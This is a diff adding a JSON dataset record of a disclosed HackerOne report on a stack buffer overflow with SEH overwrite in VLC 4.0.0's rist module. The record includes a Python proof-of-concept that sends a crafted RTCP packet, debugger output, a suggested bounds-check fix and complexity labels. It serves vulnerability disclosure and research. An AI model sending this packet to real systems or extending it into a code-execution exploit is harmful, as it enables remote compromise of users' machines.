@@ -1,0 +1,42 @@
+{
+  "reported_to": "VLC (European Commission - DIGIT)",
+  "reported_by": "qrayn ",
+  "title": "VLC 4.0.0 - Stack Buffer Overflow (SEH)",
+  "content": "\nSummary:\nIncorrect calculation of Buffer Size in rist module for VLC leading to Stack Overflow with SEH chain overwrite.\nThe modules/access/rist module has an incorrect calculation of buffer size giving an attacker the possibility to set the buffer size of a local variable by sending a maliciously crafted RTSP packet and overflowing the variable in a proceeding memcpy operation.\nDescription:\nIn the static void rtcp_input(...) function a variable new_sender_name is defined with a maximum size of MAX_CNAME (128 bytes). When reading a RTCP_PT_SDES package the length for the memcpy operation is set by the rtcp_sdes_get_name_length(buf) which is taking the 9-10th bit of the buffer and making it possible to change the amount of bytes read into the new_sender_name variable.\nrtcp_input(...) (modules/access/rist.c)\nCode 343 Bytes\n1/** Sender name is set to max length of MAX_CNAME (128), line: 446 **/\n2char new_sender_name[MAX_CNAME];\n3\n4/** name_length is read from the RTSP header, line: 489 **/\n5int8_t name_length = rtcp_sdes_get_name_length(buf);\n6\n7/** memcpy new_sender_name with name_length bytes, line: 525 **/\n8memcpy(new_sender_name, buf + RTCP_SDES_SIZE, name_length);\nFor this to be exploitable the user has to first actively setup a rist listener using VLC.\nSteps To Reproduce:\nOpen VLC and bind rist on local port: vlc.exe rist://0.0.0.0:8888\nEdit IP and port configuration in vlc.py\nExecute PoC: ./vlc.py\nSupporting Material/References:\nProof of Concept\nCode 678 Bytes\n1#!/usr/bin/python\n2import socket\n3\n4server = (\"192.168.0.23\", 8889)\n5udp = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)\n6\n7bufsize = \"\\x80\" # Amounts of bytes we want read into new_sender_name (128 bytes)\n8\n9buf = \"\\x80\"                  # Version and padding\n10buf += \"\\xCA\"                 # packet type = RTCP_PT_SDES\n11buf += \"\\x00\\x00\"             # Record length\n12buf += \"\\x00\\x00\\x00\\x00\\x00\" # SDES record\n13buf += bufsize                # Buffer size of name 9-10 bit\n14\n15# 64 bit\n16buf += \"A\" * 232 + \"B\" * 8 + \"C\" * 8 + \"D\" * 200 # Buffer for new_sender_name\n17\n18# 32 bit\n19#buf += \"A\" * 568 + \"B\" * 4 + \"C\" * 4 + \"D\" * 50 # Buffer for new_sender_name\n20\n21udp.sendto(buf, server)\nSEH chain overwrite\n0:019> !exchain\n100 stack frames, scanning for handlers...\nFrame 0x01: error getting module for 4242424242424242\nFrame 0x02: error getting module for 4343434343434343\nFrame 0x03: error getting module for 4444444444444444\n0:019> !exchain\n3411ff68: 43434343\nInvalid exception stack at 42424242\nSuggested mitigation\nExtended bounds checking on line 490 would mitigate this problem.\nReplacing the following code on line 490:\nCode 29 Bytes\n1if (name_length > bytes_left)\nWith an extended bounds check:\nCode 57 Bytes\n1if (name_length > bytes_left || name_length >= MAX_CNAME)\nImpact\nImpact\nHigh implication buffer overflow causing application crash and SEH record overwrite. Explotation plausible depending on system and security setup.\nSuccessful exploitation could lead to remote code execution and full system compromise.\nIf the user is using rist this vulnerability would be able to execute remotely.\nAffected versions\nThe code seems to have been introduced in a commit on 5th of November 2018 to the 4.0.0-dev branch. Earlier versions seems unaffected by this vulnerability.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": 2817,
+  "weaknesses": [
+    "Stack Overflow"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1581386040,
+  "report_url": "https://hackerone.com/reports/489102",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Open VLC and bind rist on local port: vlc.exe rist://0.0.0.0:8888"
+    ],
+    [
+      2,
+      "Edit IP and port configuration in vlc.py"
+    ],
+    [
+      3,
+      "Execute PoC: ./vlc.py"
+    ]
+  ],
+  "vuln_description": "Incorrect calculation of Buffer Size in rist module for VLC leading to Stack Overflow with SEH chain overwrite. The modules/access/rist module has an incorrect calculation of buffer size giving an attacker the possibility to set the buffer size of a local variable by sending a maliciously crafted RTSP packet and overflowing the variable in a proceeding memcpy operation.",
+  "reason": "The vulnerability involves understanding the buffer size calculation in the rist module and crafting a malicious RTSP packet to exploit it. While the steps to reproduce are straightforward, the discovery requires knowledge of the rist module's internal workings and the specific buffer overflow condition.",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null
+}
